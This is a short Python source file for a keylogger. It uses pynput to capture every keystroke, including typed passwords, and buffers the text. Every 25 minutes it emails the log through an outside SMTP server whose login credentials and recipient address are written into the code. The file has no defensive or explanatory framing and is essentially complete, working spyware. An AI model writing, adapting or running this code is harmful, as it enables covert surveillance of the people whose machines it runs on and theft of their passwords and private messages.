import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput.keyboard import Key, Listener
import time

smtp_server = 'sandbox.smtp.mailtrap.io'
smtp_port = 2525
smtp_username = '0fd0b30906a6da'
smtp_password = 'ab0fdf636b3dd9'

sender_email = 'bakh3ridze@gmail.com'
receiver_email = 'bakh3ridze@gmail.com'

def send_email(log):

    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = receiver_email
    message['Subject'] = 'log'

    body = log
    message.attach(MIMEText(body, 'plain'))

    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.login(smtp_username, smtp_password)
            server.send_message(message)
    except:
        print('A')

def send_periodic_emails():
    global log
    while True:
        time.sleep(60 * 25)
        if log != '':
            send_email(log)
            log = '';

log = '';

def on_press(key):
    global log
    if key == Key.enter:
        log += '[E]'
    elif key == Key.backspace:
        log += '[B]'
    elif key == Key.space:
        log += '[S]'
    elif len(str(key)) == 3:
        log += str(key).replace("'", "")

listener = Listener(on_press=on_press)
listener.start()

send_periodic_emails()